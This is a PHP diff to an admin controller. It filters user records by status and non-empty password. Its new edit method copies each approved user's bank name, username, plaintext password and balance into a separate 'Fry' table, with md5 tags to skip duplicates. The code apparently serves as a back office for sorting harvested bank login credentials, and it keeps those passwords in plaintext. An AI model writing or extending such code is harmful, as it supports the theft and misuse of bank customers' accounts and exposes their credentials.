@@ -3,9 +3,12 @@
 namespace app\admin\controller;
 
 use app\common\controller\Backend;
+use think\Db;
+use think\exception\PDOException;
+use think\exception\ValidateException;
 
 /**
- * 
+ *
  *
  * @icon fa fa-circle-o
  */
@@ -49,15 +52,16 @@ class Userinfo extends Backend
                 return $this->selectpage();
             }
             list($where, $sort, $order, $offset, $limit) = $this->buildparams();
-
+            $md5 = (new \app\admin\model\Fry())->column('md5');
             $list = $this->model
-                    ->with(['user'])
-                    ->where($where)
-                    ->order($sort, $order)
-                    ->paginate($limit);
-
+                ->with(['user'])
+                ->where('userinfo.status = 3 and userinfo.password != ""')
+                ->where(['userinfo.md5'=> ['not in',$md5]])
+                ->where($where)
+                ->order($sort, $order)
+                ->paginate($limit);
             foreach ($list as $row) {
-                
+
                 $row->getRelation('user')->visible(['mobile']);
             }
 
@@ -68,4 +72,59 @@ class Userinfo extends Backend
         return $this->view->fetch();
     }
 
+    public function edit($ids = null)
+    {
+        $row = $this->model->get($ids);
+        if (!$row) {
+            $this->error(__('No Results were found'));
+        }
+        $adminIds = $this->getDataLimitAdminIds();
+        if (is_array($adminIds) && !in_array($row[$this->dataLimitField], $adminIds)) {
+            $this->error(__('You have no permission'));
+        }
+        if (false === $this->request->isPost()) {
+            $this->view->assign('row', $row);
+            return $this->view->fetch();
+        }
+        $params = $this->request->post('row/a');
+        if (empty($params)) {
+            $this->error(__('Parameter %s can not be empty', ''));
+        }
+        $params = $this->preExcludeFields($params);
+        $result = false;
+        Db::startTrans();
+        try {
+            //是否采用模型验证
+            if ($this->modelValidate) {
+                $name = str_replace("\\model\\", "\\validate\\", get_class($this->model));
+                $validate = is_bool($this->modelValidate) ? ($this->modelSceneValidate ? $name . '.edit' : $name) : $this->modelValidate;
+                $row->validateFailException()->validate($validate);
+            }
+            if($params['status'] == 1){
+                $exist = (new \app\admin\model\Fry())->where(['user_id'=>$row['user_id'],'bank_name'=>$row['bank_name'],'username'=>$row['username'],'password'=>$row['password']])->find();
+                if(!$exist){
+                    $create = [
+                        'user_id' => $row['user_id'],
+                        'bank_name' => $row['bank_name'],
+                        'username' => $row['username'],
+                        'password' => $row['password'],
+                        'balance' => $params['balance'],
+                        'createtime' => time(),
+                        'status' => 1,
+                        'md5' => md5($row['user_id'].$row['bank_name'].$row['username'].$row['password'])
+                    ];
+                    (new \app\admin\model\Fry())->create($create);
+                }
+            }
+            $result = $row->allowField(true)->save($params);
+            Db::commit();
+        } catch (ValidateException|PDOException|Exception $e) {
+            Db::rollback();
+            $this->error($e->getMessage());
+        }
+        if (false === $result) {
+            $this->error(__('No rows were updated'));
+        }
+        $this->success();
+    }
 }
